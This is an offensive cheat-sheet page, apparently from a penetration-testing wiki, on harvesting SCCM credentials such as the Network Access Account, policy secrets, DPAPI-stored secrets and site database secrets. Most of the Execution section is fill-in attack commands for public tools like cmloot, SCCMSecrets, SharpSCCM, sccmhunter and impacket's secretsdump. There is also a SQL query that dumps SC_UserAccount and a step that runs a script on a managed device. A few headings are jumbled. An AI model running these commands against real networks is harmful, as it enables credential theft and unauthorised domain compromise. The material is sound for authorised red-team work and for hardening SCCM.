# SCCM Credential Harvesting

SCCM clients receive credentials to reach content and policy — the Network Access Account chief among them. Those credentials can be recovered from a client via DPAPI, from a policy request, or from a PXE boot image.

## Why It Works

For clients to install software before a user logs in, SCCM distributes credentials that must be usable by the machine unattended. Anything usable unattended is recoverable by someone with access to the machine or its policy.

## Prerequisites

* Local access to an SCCM client, or the ability to make a policy request
* Any valid domain credential for policy-based methods

## Execution

**Creds-1 No credentials**

* Extract from pxe See no creds
  * **→ PXE**
    * **→ NAA credentials**
    * **→ User + Pass**

**CRED-6 Loot creds**

* SCCM SMB service (445/TCP) on a DP
  * `cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt` [\[tool\]](https://github.com/shelltrail/cmloot/tree/main)
* SCCM HTTP service (80/TCP or 443/TCP) on a DP
  * `SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'` [\[tool\]](https://github.com/synacktiv/SCCMSecrets)
    * **→ User + Pass**
  * `SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'` [\[tool\]](https://github.com/synacktiv/SCCMSecrets)
  * `sccm-http-looter -server <ip_dp>` [\[tool\]](https://github.com/badsectorlabs/sccm-http-looter)

**Creds-2:Policy Request Credentials Simple user**

* add computer
  * `sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\<computer_added>$' '<computer_pass>'` [\[tool\]](https://github.com/xpn/sccmwtf/tree/main)
    * get NetworkAccessUsername and NetworkAccessPassword
      * `policysecretunobfuscate.py` [\[tool\]](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py)
        * delete device created after sccmadmin
          * **→ User + Pass**
  * `SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"` [\[tool\]](https://github.com/Mayyhem/SharpSCCM)
    * cleanup

**Creds-3Creds-4 Computer Admin user**

* `dploot.py sccm -u <admin> -p '<password>' <sccm_target>` [\[tool\]](https://github.com/zblurx/dploot)
* `sccmhunter.py dpapi -u <admin> -p '<password>' -target <sccm_target> -debug` [\[tool\]](https://github.com/garrettfoster13/sccmhunter)
  * **→ NAA credentials**
* `SharpSCCM.exe local secrets -m disk` [\[tool\]](https://github.com/Mayyhem/SharpSCCM)
* `SharpSCCM.exe local secrets -m wmi` [\[tool\]](https://github.com/Mayyhem/SharpSCCM)

**Creds-5 SCCM admin**

* `secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
  * `mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>' '<domain>/<sccm_target>$'@<sccm_mssql>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
    * `use CM_<site_code>;`
      * `SELECT * FROM SC_UserAccount;`
        * `sccmdecryptpoc.exe <cyphered_value>`
          * **→ Site DB credentials**
    * `get_device <hostname>`
      * `interact <device_id>`
        * `script xploit.ps1`

## Related

* [PXE Credential Extraction](file:///9685693/credential-access/pxe-credential-extraction.md) — the PXE variant in detail
* [DPAPI Secrets](file:///9685693/host-access/dpapi-secrets.md) — how the client-stored credentials are protected
